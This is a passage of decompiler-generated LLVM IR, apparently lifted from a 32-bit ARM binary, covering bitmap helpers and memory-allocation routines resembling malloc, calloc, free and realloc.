  %v5_14028 = add i32 %v4_14028, %v10_13fdc
  br i1 %v6_14020, label %dec_label_pc_14030, label %dec_label_pc_14018

dec_label_pc_14030:                               ; preds = %dec_label_pc_14018
  %v2_14030 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_14030, i32* @r5, align 4
  %v2_14034 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_14034, i32* @r0, align 4
  %v0_14038 = load i32, i32* @r4, align 4
  store i32 %v0_14038, i32* @r1, align 4
  %v0_1403c = call i32 @function_140b8()
  store i32 %v0_1403c, i32* %r0.global-to-local, align 4
  %v1_14040 = icmp slt i32 %v0_1403c, 0
  br i1 %v1_14040, label %dec_label_pc_14080, label %dec_label_pc_14048

dec_label_pc_14048:                               ; preds = %dec_label_pc_14030
  %v0_14048 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1ee48.611 to i32), i32* %r0.global-to-local, align 4
  %v2_14050 = call i32 @function_14094(i32 ptrtoint (i32* @global_var_1ee48.611 to i32), i32 %v0_14048)
  %v0_14068 = load i32, i32* @r4, align 4
  store i32 %v0_14068, i32* %r0.global-to-local, align 4
  %v4_14070 = call i32 @function_14f80(i32 %v0_14068, i32* nonnull %stack_var_-152, i32 %v2_13fe8)
  store i32 %v4_14070, i32* %r0.global-to-local, align 4
  %v1_14074 = icmp slt i32 %v4_14070, 0
  br i1 %v1_14074, label %dec_label_pc_14080, label %bb23

bb23:                                             ; preds = %dec_label_pc_14048
  %v5_14078 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_14078, i32* @r2, align 4
  br label %dec_label_pc_14084

dec_label_pc_14080:                               ; preds = %dec_label_pc_14048, %dec_label_pc_14030
  store i32 -1, i32* @r2, align 4
  br label %dec_label_pc_14084

dec_label_pc_14084:                               ; preds = %bb23, %dec_label_pc_14004, %dec_label_pc_14080
  %v0_14084 = phi i32 [ %v5_14078, %bb23 ], [ %v0_14084.pre, %dec_label_pc_14004 ], [ -1, %dec_label_pc_14080 ]
  store i32 %v0_14084, i32* %r0.global-to-local, align 4
  %v2_1408c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1408c, i32* @r4, align 4
  store i32 %v6_13fdc, i32* @r5, align 4
  ret i32 %v0_14084

; uselistorder directives
  uselistorder i32 %v0_14084, { 1, 0 }
  uselistorder i32 %v1_14020, { 0, 2, 1 }
  uselistorder i32 %v0_13fec.pre, { 1, 0, 2 }
  uselistorder i32 %v10_13fdc, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 9, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14084, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14018, { 1, 0 }
  uselistorder label %dec_label_pc_14004, { 1, 2, 0 }
}

define i32 @function_14094(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14094:
  %v1_14094 = add i32 %arg2, -1
  %v3_14098 = udiv i32 %v1_14094, 32
  %v4_1409c = mul nuw nsw i32 %v3_14098, 4
  %v5_1409c = add i32 %v4_1409c, %arg1
  %v6_1409c = inttoptr i32 %v5_1409c to i32*
  %v7_1409c = load i32, i32* %v6_1409c, align 4
  %v1_140a0 = urem i32 %v1_14094, 32
  %v7_140a8 = shl i32 1, %v1_140a0
  %v8_140a8 = and i32 %v7_1409c, %v7_140a8
  %v10_140a8 = icmp ne i32 %v8_140a8, 0
  %. = zext i1 %v10_140a8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_14094, { 1, 0 }
}

define i32 @function_140b8() local_unnamed_addr {
dec_label_pc_140b8:
  %v0_140b8 = load i32, i32* @r1, align 4
  %v1_140b8 = add i32 %v0_140b8, -1
  %v3_140bc = udiv i32 %v1_140b8, 32
  store i32 %v3_140bc, i32* @ip, align 4
  %v0_140c0 = load i32, i32* @r0, align 4
  %v4_140c0 = mul nuw nsw i32 %v3_140bc, 4
  %v5_140c0 = add i32 %v0_140c0, %v4_140c0
  %v6_140c0 = inttoptr i32 %v5_140c0 to i32*
  %v7_140c0 = load i32, i32* %v6_140c0, align 4
  %v1_140c4 = urem i32 %v1_140b8, 32
  %v7_140cc = shl i32 1, %v1_140c4
  %v8_140cc = or i32 %v7_140c0, %v7_140cc
  store i32 %v8_140cc, i32* %v6_140c0, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_140bc, { 1, 0 }
  uselistorder i32 %v1_140b8, { 1, 0 }
}

define i32 @function_140dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_140dc:
  %v1_140dc = add i32 %arg2, -1
  %v3_140e0 = udiv i32 %v1_140dc, 32
  %v4_140e4 = mul nuw nsw i32 %v3_140e0, 4
  %v5_140e4 = add i32 %v4_140e4, %arg1
  %v6_140e4 = inttoptr i32 %v5_140e4 to i32*
  %v7_140e4 = load i32, i32* %v6_140e4, align 4
  %v1_140e8 = urem i32 %v1_140dc, 32
  %tmp = shl i32 -1, %v1_140e8
  %v8_140f0 = add i32 %tmp, -1
  %v9_140f0 = and i32 %v7_140e4, %v8_140f0
  store i32 %v9_140f0, i32* %v6_140e4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_140dc, { 1, 0 }
}

define i32 @function_14100(i32 %arg1) local_unnamed_addr {
dec_label_pc_14100:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14100 = load i32, i32* @r4, align 4
  %v6_14100 = load i32, i32* @r5, align 4
  %v9_14100 = load i32, i32* @r6, align 4
  %v0_14104 = load i32, i32* %r0.global-to-local, align 4
  %v2_14104 = icmp eq i32 %v0_14104, 0
  %v2_14108 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_14104, label %bb, label %dec_label_pc_14114

bb:                                               ; preds = %dec_label_pc_14100
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1411c

dec_label_pc_14114:                               ; preds = %dec_label_pc_14100
  %tmp = icmp ugt i32 %v0_14104, -8
  br i1 %tmp, label %dec_label_pc_14220, label %dec_label_pc_1411c

dec_label_pc_1411c:                               ; preds = %bb, %dec_label_pc_14114
  %v0_1411c = phi i32 [ %v0_14104, %dec_label_pc_14114 ], [ 1, %bb ]
  %v1_1411c = add i32 %v0_1411c, 4
  store i32 %v1_1411c, i32* %stack_var_-20, align 4
  store i32 %v2_14108, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1ec38.613 to i32), i32* %r0.global-to-local, align 4
  %v1_14134 = call i32 @function_14c94()
  store i32 ptrtoint (i32** @global_var_1ea60.617 to i32), i32* %r0.global-to-local, align 4
  %v3_14140 = call i32 @function_144b4(i32* bitcast (i32** @global_var_1ea60.617 to i32*), i32 %v2_14108)
  store i32 %v3_14140, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec38.613 to i32), i32* %r0.global-to-local, align 4
  store i32 82264, i32* @lr, align 4
  %v1_14154 = call i32 @function_14c94()
  store i32 %v1_14154, i32* %r0.global-to-local, align 4
  %v2_14158 = icmp eq i32 %v3_14140, 0
  br i1 %v2_14158, label %dec_label_pc_14160, label %dec_label_pc_14210

dec_label_pc_14160:                               ; preds = %dec_label_pc_1411c
  %v2_14164 = load i32, i32* @global_var_1ec60.620, align 4
  store i32 %v2_14164, i32* @r4, align 4
  %v2_14168 = load i32, i32* %stack_var_-20, align 4
  %v3_1416c = icmp ult i32 %v2_14168, %v2_14164
  br i1 %v3_1416c, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_14160
  %v3_14170 = add i32 %v2_14164, -1
  %v2_14174 = add i32 %v3_14170, %v2_14168
  %v2_14178 = sub i32 0, %v2_14164
  %v3_1417c = and i32 %v2_14174, %v2_14178
  store i32 %v3_1417c, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_14160, %bb14
  store i32 ptrtoint (i32* @global_var_1eec8.622 to i32), i32* %r0.global-to-local, align 4
  %v1_14188 = call i32 @function_14c94()
  %v0_1418c = load i32, i32* @r4, align 4
  store i32 %v0_1418c, i32* %r0.global-to-local, align 4
  %v1_14190 = call i32 @function_15448(i32 %v0_1418c)
  store i32 %v1_14190, i32* %r0.global-to-local, align 4
  %v7_14194 = icmp eq i32 %v1_14190, -1
  br i1 %v7_14194, label %bb15, label %dec_label_pc_141a0

bb15:                                             ; preds = %.thread3
  store i32 %v1_14190, i32* @r5, align 4
  br label %dec_label_pc_141b4

dec_label_pc_141a0:                               ; preds = %.thread3
  %v1_141a0 = add i32 %v1_14190, 3
  %v1_141a4 = and i32 %v1_141a0, -4
  store i32 %v1_141a4, i32* @r5, align 4
  %v9_141a8 = icmp eq i32 %v1_141a4, %v1_14190
  br i1 %v9_141a8, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_141a0
  %v3_141ac = sub i32 %v1_141a4, %v1_14190
  store i32 %v3_141ac, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_141a0, %bb16
  %v1_141b0 = xor i1 %v9_141a8, true
  call void @__pseudo_cond_branch(i1 %v1_141b0, i32 ptrtoint (i32* @global_var_15448.623 to i32))
  br label %dec_label_pc_141b4

dec_label_pc_141b4:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_1eec8.622 to i32), i32* %r0.global-to-local, align 4
  store i32 82372, i32* @lr, align 4
  %v1_141c0 = call i32 @function_14c94()
  store i32 %v1_141c0, i32* %r0.global-to-local, align 4
  %v0_141c4 = load i32, i32* @r5, align 4
  %v7_141c4 = icmp eq i32 %v0_141c4, -1
  br i1 %v7_141c4, label %dec_label_pc_14220, label %dec_label_pc_141cc

dec_label_pc_141cc:                               ; preds = %dec_label_pc_141b4
  store i32 ptrtoint (i32* @global_var_1ec38.613 to i32), i32* %r0.global-to-local, align 4
  %v1_141d8 = call i32 @function_14c94()
  %v0_141dc = load i32, i32* @r4, align 4
  %v0_141e0 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1ea60.617 to i32), i32* %r0.global-to-local, align 4
  %v4_141e8 = call i32 @function_14608(i32* bitcast (i32** @global_var_1ea60.617 to i32*), i32 %v0_141e0, i32 %v0_141dc)
  store i32 ptrtoint (i32** @global_var_1ea60.617 to i32), i32* %r0.global-to-local, align 4
  %v3_141f4 = call i32 @function_144b4(i32* bitcast (i32** @global_var_1ea60.617 to i32*), i32 %v2_14108)
  store i32 %v3_141f4, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ec38.613 to i32), i32* %r0.global-to-local, align 4
  store i32 82440, i32* @lr, align 4
  %v1_14204 = call i32 @function_14c94()
  store i32 %v1_14204, i32* %r0.global-to-local, align 4
  %v2_14208 = icmp eq i32 %v3_141f4, 0
  br i1 %v2_14208, label %dec_label_pc_14220, label %dec_label_pc_14210

dec_label_pc_14210:                               ; preds = %dec_label_pc_1411c, %dec_label_pc_141cc
  %v1_14214 = phi i32 [ %v3_14140, %dec_label_pc_1411c ], [ %v3_141f4, %dec_label_pc_141cc ]
  %v2_14210 = load i32, i32* %stack_var_-20, align 4
  %v2_14214 = inttoptr i32 %v1_14214 to i32*
  store i32 %v2_14210, i32* %v2_14214, align 4
  %v3_14214 = load i32, i32* %r4.global-to-local, align 4
  %v4_14214 = add i32 %v3_14214, 4
  store i32 %v4_14214, i32* %r4.global-to-local, align 4
  %v2_14218 = icmp eq i32 %v4_14214, 0
  br i1 %v2_14218, label %dec_label_pc_14220, label %dec_label_pc_14230

dec_label_pc_14220:                               ; preds = %dec_label_pc_14210, %dec_label_pc_141cc, %dec_label_pc_141b4, %dec_label_pc_14114
  %v0_14220 = call i32 @function_13c28()
  store i32 %v0_14220, i32* %r0.global-to-local, align 4
  %v2_14228 = inttoptr i32 %v0_14220 to i32*
  store i32 12, i32* %v2_14228, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14230

dec_label_pc_14230:                               ; preds = %dec_label_pc_14210, %dec_label_pc_14220
  %v0_14230 = phi i32 [ %v4_14214, %dec_label_pc_14210 ], [ 0, %dec_label_pc_14220 ]
  store i32 %v0_14230, i32* %r0.global-to-local, align 4
  store i32 %v3_14100, i32* @r4, align 4
  store i32 %v6_14100, i32* @r5, align 4
  store i32 %v9_14100, i32* @r6, align 4
  ret i32 %v0_14230

; uselistorder directives
  uselistorder i32 %v0_14230, { 1, 0 }
  uselistorder i32 %v3_141f4, { 1, 0, 2 }
  uselistorder i32 %v1_141a4, { 1, 0, 2 }
  uselistorder i32 %v1_14190, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v3_14140, { 1, 0, 2 }
  uselistorder i32 %v0_14104, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 5, 7, 4, 6, 8, 9, 10, 1, 12, 11, 19, 14, 13, 0, 15, 16, 17, 18, 2, 3 }
  uselistorder label %dec_label_pc_14230, { 1, 0 }
  uselistorder label %dec_label_pc_14210, { 1, 0 }
  uselistorder label %dec_label_pc_141b4, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1411c, { 1, 0 }
}

define i32 @function_14254(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14254:
  %stack_var_-12 = alloca i32, align 4
  %v3_14254 = load i32, i32* @r4, align 4
  store i32 %v3_14254, i32* %stack_var_-12, align 4
  %v6_14254 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v2_1425c = mul i32 %arg2, %arg1
  store i32 %v2_1425c, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_14260 = icmp eq i32 %arg1, 0
  store i32 %v2_1425c, i32* @r0, align 4
  br i1 %v2_14260, label %dec_label_pc_1428c, label %dec_label_pc_1426c

dec_label_pc_1426c:                               ; preds = %dec_label_pc_14254
  %v0_1426c = call i32 @function_132a0()
  %v0_14270 = load i32, i32* @r5, align 4
  %v9_14270 = icmp eq i32 %v0_14270, %v0_1426c
  store i32 0, i32* @r5, align 4
  br i1 %v9_14270, label %dec_label_pc_1426c.dec_label_pc_1428c_crit_edge, label %dec_label_pc_1427c

dec_label_pc_1426c.dec_label_pc_1428c_crit_edge:  ; preds = %dec_label_pc_1426c
  %v0_1428c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1428c

dec_label_pc_1427c:                               ; preds = %dec_label_pc_1426c
  %v0_1427c = call i32 @function_13c28()
  %v2_14284 = inttoptr i32 %v0_1427c to i32*
  store i32 12, i32* %v2_14284, align 4
  br label %dec_label_pc_142a4

dec_label_pc_1428c:                               ; preds = %dec_label_pc_1426c.dec_label_pc_1428c_crit_edge, %dec_label_pc_14254
  %v0_1428c = phi i32 [ %v0_1428c.pre, %dec_label_pc_1426c.dec_label_pc_1428c_crit_edge ], [ %v2_1425c, %dec_label_pc_14254 ]
  %v1_14290 = call i32 @function_14100(i32 %v0_1428c)
  store i32 %v1_14290, i32* @r5, align 4
  store i32 82596, i32* @lr, align 4
  %v1_142a0 = icmp ne i32 %v1_14290, 0
  call void @__pseudo_cond_branch(i1 %v1_142a0, i32 ptrtoint (i32* @global_var_13c90.624 to i32))
  br label %dec_label_pc_142a4

dec_label_pc_142a4:                               ; preds = %dec_label_pc_1427c, %dec_label_pc_1428c
  %v0_142a4 = load i32, i32* @r5, align 4
  %v2_142a8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_142a8, i32* @r4, align 4
  store i32 %v6_14254, i32* @r5, align 4
  ret i32 %v0_142a4

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_142a4, { 1, 0 }
}

define i32 @function_142ac() local_unnamed_addr {
dec_label_pc_142ac:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_142ac = load i32, i32* @r0, align 4
  %v2_142ac = icmp eq i32 %v0_142ac, 0
  %v3_142b0 = load i32, i32* @r4, align 4
  store i32 %v3_142b0, i32* %stack_var_-24, align 4
  %v6_142b0 = load i32, i32* @r5, align 4
  %v9_142b0 = load i32, i32* @r6, align 4
  %v15_142b0 = load i32, i32* @r8, align 4
  br i1 %v2_142ac, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_142ac
  ret i32 0

bb11:                                             ; preds = %dec_label_pc_142ac
  %v1_142b8 = add i32 %v0_142ac, -4
  %v2_142b8 = inttoptr i32 %v1_142b8 to i32*
  %v3_142b8 = load i32, i32* %v2_142b8, align 4
  store i32 %v3_142b8, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_1ea60.617 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_142b8, i32* @r4, align 4
  %v1_142d0 = call i32 @function_14c94()
  %v0_142d4 = load i32, i32* @r4, align 4
  %v0_142d8 = load i32, i32* @r5, align 4
  %v4_142e0 = call i32 @function_14608(i32* bitcast (i32** @global_var_1ea60.617 to i32*), i32 %v0_142d4, i32 %v0_142d8)
  %v1_142e8 = inttoptr i32 %v4_142e0 to i32*
  %v2_142e8 = load i32, i32* %v1_142e8, align 4
  store i32 %v2_142e8, i32* %r6.global-to-local, align 4
  %v2_142ec = load i32, i32* @global_var_1ec60.620, align 4
  %v4_142f0 = mul i32 %v2_142ec, 8
  %v6_142f0 = icmp ult i32 %v2_142e8, %v4_142f0
  store i32 %v4_142e0, i32* @r4, align 4
  br i1 %v6_142f0, label %dec_label_pc_14330, label %dec_label_pc_142fc

dec_label_pc_142fc:                               ; preds = %bb11
  %v1_14304 = call i32 @function_14c94()
  %v1_1430c = call i32 @function_15448(i32 0)
  %v0_14310 = load i32, i32* @r4, align 4
  %v1_14310 = add i32 %v0_14310, 12
  store i32 %v1_14310, i32* @r5, align 4
  %v9_14314 = icmp eq i32 %v1_14310, %v1_1430c
  br i1 %v9_14314, label %dec_label_pc_14338, label %dec_label_pc_1431c

dec_label_pc_1431c:                               ; preds = %dec_label_pc_142fc
  %v1_14328 = call i32 @function_14c94()
  br label %dec_label_pc_14330

dec_label_pc_14330:                               ; preds = %bb11, %dec_label_pc_1431c, %bb14
  %v2_14330 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14330, i32* @r4, align 4
  store i32 %v6_142b0, i32* @r5, align 4
  store i32 %v9_142b0, i32* %r6.global-to-local, align 4
  store i32 %v15_142b0, i32* %r8.global-to-local, align 4
  %v0_14334 = call i32 @function_14c94()
  %v0_14338.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14338

dec_label_pc_14338:                               ; preds = %dec_label_pc_142fc, %dec_label_pc_14330
  %v1_14340 = phi i32 [ %v0_14310, %dec_label_pc_142fc ], [ %v0_14338.pre, %dec_label_pc_14330 ]
  %v1_14338 = add i32 %v1_14340, 4
  %v2_14338 = inttoptr i32 %v1_14338 to i32*
  %v3_14338 = load i32, i32* %v2_14338, align 4
  %v2_1433c = icmp eq i32 %v3_14338, 0
  br i1 %v2_1433c, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_14338
  %v2_14340 = add i32 %v1_14340, 8
  %v3_14340 = inttoptr i32 %v2_14340 to i32*
  %v4_14340 = load i32, i32* %v3_14340, align 4
  %v3_14344 = add i32 %v3_14338, 8
  %v4_14344 = inttoptr i32 %v3_14344 to i32*
  store i32 %v4_14340, i32* %v4_14344, align 4
  %v0_14348.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14338, %bb12
  %v0_14348 = phi i32 [ %v1_14340, %dec_label_pc_14338 ], [ %v0_14348.pre, %bb12 ]
  %v1_14348 = add i32 %v0_14348, 8
  %v2_14348 = inttoptr i32 %v1_14348 to i32*
  %v3_14348 = load i32, i32* %v2_14348, align 4
  %v1_1434c = add i32 %v0_14348, 4
  %v2_1434c = inttoptr i32 %v1_1434c to i32*
  %v3_1434c = load i32, i32* %v2_1434c, align 4
  %v2_14350 = icmp eq i32 %v3_14348, 0
  br i1 %v2_14350, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_14354 = add i32 %v3_14348, 4
  %v4_14354 = inttoptr i32 %v3_14354 to i32*
  store i32 %v3_1434c, i32* %v4_14354, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_14358 = load i32, i32* %r8.global-to-local, align 4
  %v3_14358 = inttoptr i32 %v2_14358 to i32*
  store i32 %v3_1434c, i32* %v3_14358, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_14368 = call i32 @function_14c94()
  %v0_1436c = load i32, i32* %r6.global-to-local, align 4
  %v1_1436c = load i32, i32* @r4, align 4
  %v0_14374 = load i32, i32* @r5, align 4
  %v2_1436c = sub i32 12, %v0_1436c
  %v1_14370 = add i32 %v2_1436c, %v1_1436c
  %v2_14374 = sub i32 %v1_14370, %v0_14374
  %v1_14378 = call i32 @function_15448(i32 %v2_14374)
  br label %dec_label_pc_14330

; uselistorder directives
  uselistorder i32 %v0_14348, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_15448, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_14338, { 1, 0 }
  uselistorder label %dec_label_pc_14330, { 2, 1, 0 }
}

define i32 @function_1439c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1439c:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1439c = load i32, i32* @r4, align 4
  store i32 %v3_1439c, i32* %stack_var_-24, align 4
  %v6_1439c = load i32, i32* @r5, align 4
  %v9_1439c = load i32, i32* @r6, align 4
  %v12_1439c = load i32, i32* @r7, align 4
  %v15_1439c = load i32, i32* @r8, align 4
  %v18_1439c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_143a0 = icmp eq i32 %arg2, 0
  %v0_143a4 = load i32, i32* @r0, align 4
  store i32 %v0_143a4, i32* @r7, align 4
  br i1 %v2_143a0, label %dec_label_pc_143ac, label %dec_label_pc_143b4

dec_label_pc_143ac:                               ; preds = %dec_label_pc_1439c
  %v0_143ac = call i32 @function_142ac()
  %v0_143bc.pre = load i32, i32* @r4, align 4
  %v2_143c0.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_143bc

dec_label_pc_143b4:                               ; preds = %dec_label_pc_1439c
  %v2_143b4 = icmp eq i32 %v0_143a4, 0
  br i1 %v2_143b4, label %dec_label_pc_143bc, label %dec_label_pc_143c8

dec_label_pc_143bc:                               ; preds = %dec_label_pc_143b4, %dec_label_pc_143ac
  %v2_143c0 = phi i32 [ %v3_1439c, %dec_label_pc_143b4 ], [ %v2_143c0.pre, %dec_label_pc_143ac ]
  %v0_143bc = phi i32 [ %arg2, %dec_label_pc_143b4 ], [ %v0_143bc.pre, %dec_label_pc_143ac ]
  store i32 %v2_143c0, i32* @r4, align 4
  store i32 %v6_1439c, i32* @r5, align 4
  store i32 %v9_1439c, i32* @r6, align 4
  store i32 %v12_1439c, i32* @r7, align 4
  store i32 %v18_1439c, i32* @lr, align 4
  %v1_143c4 = call i32 @function_14100(i32 %v0_143bc)
  %v0_143c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_143c8

dec_label_pc_143c8:                               ; preds = %dec_label_pc_143b4, %dec_label_pc_143bc
  %v0_143e0 = phi i32 [ %v0_143a4, %dec_label_pc_143b4 ], [ %v1_143c4, %dec_label_pc_143bc ]
  %v0_143c8 = phi i32 [ %arg2, %dec_label_pc_143b4 ], [ %v0_143c8.pre, %dec_label_pc_143bc ]
  %v1_143c8 = add i32 %v0_143c8, 7
  %v1_143cc = and i32 %v1_143c8, -4
  store i32 %v1_143cc, i32* @r5, align 4
  %v2_143d0 = icmp ugt i32 %v1_143cc, 10
  %v1_143d4 = add i32 %v0_143e0, -4
  %v2_143d4 = inttoptr i32 %v1_143d4 to i32*
  %v3_143d4 = load i32, i32* %v2_143d4, align 4
  store i32 %v3_143d4, i32* @r6, align 4
  br i1 %v2_143d0, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_143c8
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_143c8, %bb
  %v0_1445c = phi i32 [ %v1_143cc, %dec_label_pc_143c8 ], [ 12, %bb ]
  store i32 %v1_143d4, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_1445c, %v3_143d4
  br i1 %tmp, label %dec_label_pc_143e8, label %dec_label_pc_1445c

dec_label_pc_143e8:                               ; preds = %bb14
  %v2_143dc = sub i32 %v0_1445c, %v3_143d4
  %v1_143f8 = call i32 @function_14c94()
  %v0_14400 = load i32, i32* @r8, align 4
  %v1_14400 = load i32, i32* @r6, align 4
  %v2_14400 = add i32 %v1_14400, %v0_14400
  %v4_14408 = call i32 @function_14548(i32* bitcast (i32** @global_var_1ea60.617 to i32*), i32 %v2_14400, i32 %v2_143dc)
  store i32 %v4_14408, i32* @r4, align 4
  store i32 82976, i32* @lr, align 4
  %v1_1441c = call i32 @function_14c94()
  %v0_14420 = load i32, i32* @r4, align 4
  %v2_14420 = icmp eq i32 %v0_14420, 0
  br i1 %v2_14420, label %dec_label_pc_14430, label %.thread

.thread:                                          ; preds = %dec_label_pc_143e8
  %v1_14424 = load i32, i32* @r6, align 4
  %v3_14424 = add i32 %v1_14424, %v0_14420
  %v2_14428 = load i32, i32* @r7, align 4
  %v3_14428 = add i32 %v2_14428, -4
  %v4_14428 = inttoptr i32 %v3_14428 to i32*
  store i32 %v3_14424, i32* %v4_14428, align 4
  br label %dec_label_pc_1449c

dec_label_pc_14430:                               ; preds = %dec_label_pc_143e8
  %v0_14430 = load i32, i32* @r5, align 4
  %v1_14430 = add i32 %v0_14430, -4
  %v1_14434 = call i32 @function_14100(i32 %v1_14430)
  store i32 %v1_14434, i32* @r0, align 4
  store i32 %v1_14434, i32* @r4, align 4
  %v2_14438 = icmp eq i32 %v1_14434, 0
  br i1 %v2_14438, label %dec_label_pc_14454, label %dec_label_pc_14440

dec_label_pc_14440:                               ; preds = %dec_label_pc_14430
  %v0_14440 = load i32, i32* @r6, align 4
  %v1_14440 = add i32 %v0_14440, -4
  store i32 %v1_14440, i32* @r2, align 4
  %v0_14444 = load i32, i32* @r7, align 4
  store i32 %v0_14444, i32* @r1, align 4
  %v3_14448 = call i32 @function_13c70(i32 %v1_14434, i32 %v0_14444, i32 %v1_14440)
  %v0_1444c = load i32, i32* @r7, align 4
  store i32 %v0_1444c, i32* @r0, align 4
  %v0_14450 = call i32 @function_142ac()
  %v0_14454.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14454

dec_label_pc_14454:                               ; preds = %dec_label_pc_14430, %dec_label_pc_14440
  %v0_14454 = phi i32 [ 0, %dec_label_pc_14430 ], [ %v0_14454.pre, %dec_label_pc_14440 ]
  store i32 %v0_14454, i32* @r7, align 4
  br label %dec_label_pc_1449c

dec_label_pc_1445c:                               ; preds = %bb14
  %v1_1445c = add i32 %v0_1445c, 28
  %tmp15 = icmp ugt i32 %v1_1445c, %v3_143d4
  br i1 %tmp15, label %dec_label_pc_1449c, label %dec_label_pc_14468

dec_label_pc_14468:                               ; preds = %dec_label_pc_1445c
  %v1_14474 = call i32 @function_14c94()
  %v0_14478 = load i32, i32* @r8, align 4
  %v1_14478 = load i32, i32* @r5, align 4
  %v2_14478 = add i32 %v1_14478, %v0_14478
  %v1_1447c = load i32, i32* @r6, align 4
  %v2_1447c = sub i32 %v1_1447c, %v1_14478
  %v4_14484 = call i32 @function_14608(i32* bitcast (i32** @global_var_1ea60.617 to i32*), i32 %v2_14478, i32 %v2_1447c)
  store i32 83096, i32* @lr, align 4
  %v1_14494 = call i32 @function_14c94()
  %v0_14498 = load i32, i32* @r5, align 4
  %v1_14498 = load i32, i32* @r7, align 4
  %v2_14498 = add i32 %v1_14498, -4
  %v3_14498 = inttoptr i32 %v2_14498 to i32*
  store i32 %v0_14498, i32* %v3_14498, align 4
  br label %dec_label_pc_1449c

dec_label_pc_1449c:                               ; preds = %.thread, %dec_label_pc_1445c, %dec_label_pc_14454, %dec_label_pc_14468
  %v0_1449c = load i32, i32* @r7, align 4
  %v2_144a0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_144a0, i32* @r4, align 4
  store i32 %v6_1439c, i32* @r5, align 4
  store i32 %v9_1439c, i32* @r6, align 4
  store i32 %v12_1439c, i32* @r7, align 4
  store i32 %v15_1439c, i32* @r8, align 4
  ret i32 %v0_1449c

; uselistorder directives
  uselistorder i32 %v1_14478, { 1, 0 }
  uselistorder i32 %v0_1445c, { 1, 2, 0 }
  uselistorder i32 %v3_143d4, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32** @global_var_1ea60.617, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_1ea60.617 to i32*), { 1, 2, 0, 3, 4, 5 }
